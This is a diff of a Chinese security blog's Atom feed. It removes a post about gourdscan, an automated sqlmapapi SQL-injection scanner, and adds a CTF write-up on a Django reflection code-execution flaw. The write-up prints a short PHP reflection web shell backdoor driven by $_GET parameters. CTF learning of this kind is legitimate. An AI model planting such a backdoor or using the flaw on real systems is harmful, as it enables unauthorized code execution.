@@ -118,25 +118,6 @@ class <sp]]>
   </entry>
   
   <entry>
-    <title><![CDATA[gourdscan docker镜像]]></title>
-    <link href="http://xdxd.love/2016/01/25/gourdscan-docker%E9%95%9C%E5%83%8F/"/>
-    <id>http://xdxd.love/2016/01/25/gourdscan-docker镜像/</id>
-    <published>2016-01-25T06:14:41.000Z</published>
-    <updated>2016-01-25T06:40:09.000Z</updated>
-    <content type="html"><![CDATA[<h1 id="sqlmapapi">sqlmapapi</h1><p>sqlmap在业界的地位无需言表，想必每一个玩过sqlmap的人都想过如果把sqlmap做成自动批量扫描的工具该是多么畅快的事情。目前sqlmap提供了sqlmapapi.py，一个restful的api，利用这个api可以比较方便的打造自动化扫描器。</p>
-<h1 id="gourdscan概述">gourdscan概述</h1><p><a href="http://zone.wooyun.org/content/24172" target="_blank" rel="external">GourdScan</a>利用浏览器代理获取请求，然后利用sqlmapapi进行sql注入扫描，并提供前段界面进行结果查询和展示。虽然自动化sqlmap扫描的工具可能很多人都用上了。但是一直都没有比较完善的一个开源工具。<a href="https://github.com/zt2/sqli-hunter" target="_blank" rel="external">sqli-hunter</a>是比较成功的一个类似工具，但是使用ruby开发的。gourdscan利用php和python开发，在乌云zone中也引起了不少的关注。经过测试发现虽然整个流程和功能基本都有，但是还有较大的优化空间，目前的版本只能算是一个demo。</p>
-<h1 id="docker镜像">docker镜像</h1><h1 id="改动的地方">改动的地方</h1>]]></content>
-    <summary type="html">
-    <![CDATA[<h1 id="sqlmapapi">sqlmapapi</h1><p>sqlmap在业界的地位无需言表，想必每一个玩过sqlmap的人都想过如果把sqlmap做成自动批量扫描的工具该是多么畅快的事情。目前sqlmap提供了sqlmapapi.py，一个restful的api，利]]>
-    </summary>
-    
-      <category term="sqlmapapi" scheme="http://xdxd.love/tags/sqlmapapi/"/>
-    
-      <category term="漏洞挖掘" scheme="http://xdxd.love/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
-    
-  </entry>
-  
-  <entry>
     <title><![CDATA[input标签type为hidden时的xss利用]]></title>
     <link href="http://xdxd.love/2016/01/20/input%E6%A0%87%E7%AD%BEtype%E4%B8%BAhidden%E6%97%B6%E7%9A%84xss%E5%88%A9%E7%94%A8/"/>
     <id>http://xdxd.love/2016/01/20/input标签type为hidden时的xss利用/</id>
@@ -1032,6 +1013,42 @@ Welcome!
     <summary type="html">
     
     </summary>
+    
+  </entry>
+  
+  <entry>
+    <title><![CDATA[华山杯CTF做过的几道题]]></title>
+    <link href="http://xdxd.love/2015/11/23/%E5%8D%8E%E5%B1%B1%E6%9D%AFCTF%E5%81%9A%E8%BF%87%E7%9A%84%E5%87%A0%E9%81%93%E9%A2%98/"/>
+    <id>http://xdxd.love/2015/11/23/华山杯CTF做过的几道题/</id>
+    <published>2015-11-23T08:04:35.000Z</published>
+    <updated>2015-11-24T03:27:38.000Z</updated>
+    <content type="html"><![CDATA[<p>花时间做了几道题，感觉还是有收获的。虽然死亡之ping这些知识点不熟悉，web的python题还是学到了不少知识。</p>
+<p>登录的时候会随机报错。查看返回django的调试模式泄露源码。</p>
+<p><img src="/images/huashanctf1.png" alt=""></p>
+<p>通过改变参数多次尝试报错，可以或得部分代码：</p>
+<pre><code>c = json.loads(request.body)
+<span class="keyword">method</span> = getattr(globals()[c['obj']],c['<span class="keyword">method</span>'])
+ret = <span class="keyword">method</span>(c['params'])
+retdata['<span class="literal">result</span>'],retdata['error'] = ret
+</code></pre><p>通过反射的方式来执行对象的函数，而ojb，method和params三个参数都是可控的，这样就可以导致代码执行。具体可以参考<a href="http://www.secpulse.com/archives/40012.html" target="_blank" rel="external">writeup</a></p>
+<p>python <a href="http://stackoverflow.com/questions/12693606/reason-for-globals-in-python" target="_blank" rel="external">globals()</a>返回一个map，这个map的key是全局范围内对象的名字，value是该对象的实例。</p>
+<p>利用php的反射写的后门如下：</p>
+<pre><code><span class="php"><span class="preprocessor">&lt;?php</span>
+    <span class="variable">$func</span> = <span class="keyword">new</span> ReflectionFunction(<span class="variable">$_GET</span>[m]);
+    <span class="keyword">echo</span> <span class="variable">$func</span>-&gt;invokeArgs(<span class="keyword">array</span>(<span class="variable">$_GET</span>[c]));
+<span class="preprocessor">?&gt;</span></span>
+</code></pre><p>可以参考<a href="https://github.com/tennc/webshell/tree/master/php/p2j" target="_blank" rel="external">php反射后门</a></p>
+<p>还有做的两个题就是分析流量。感觉还是比较有意思，在网络包种寻找信息，有点侦探的感觉。一个tips就是发现base64编码的密码，使用burpsuite的decode解码base64是乱码，以为不是base64，卡半天想不出来。其实是因为是中文做的base64编码，使用在线的base64解码工具可以直接解出中文。看来以前很多看起来像base64，但是decode是乱码，很可能是因为编码不对啊。<a href="http://sudalover.com/?p=155" target="_blank" rel="external">writeup</a></p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<p>花时间做了几道题，感觉还是有收获的。虽然死亡之ping这些知识点不熟悉，web的python题还是学到了不少知识。</p>
+<p>登录的时候会随机报错。查看返回django的调试模式泄露源码。</p>
+<p><img src="/images/huashanctf1.png]]>
+    </summary>
+    
+      <category term="ctf" scheme="http://xdxd.love/tags/ctf/"/>
+    
+      <category term="黑盒测试" scheme="http://xdxd.love/categories/%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/"/>
     
   </entry>
   
